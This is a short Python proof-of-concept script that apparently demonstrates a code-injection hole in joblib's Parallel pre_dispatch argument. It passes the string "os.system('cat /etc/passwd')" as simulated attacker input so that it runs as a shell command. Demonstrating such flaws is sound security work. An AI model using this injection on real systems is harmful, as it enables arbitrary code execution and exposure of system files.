import os
from joblib import Parallel, delayed

def f(x):
    return x * x

# Vulnerable usage of joblib with eval in pre_dispatch
# This could be exploited to run arbitrary code
# Here we simulate an attacker inputting a malicious command
malicious_command = "os.system('cat /etc/passwd')"
p = Parallel(n_jobs=2, pre_dispatch=malicious_command)
results = p(delayed(f)(i) for i in range(10))

print(results)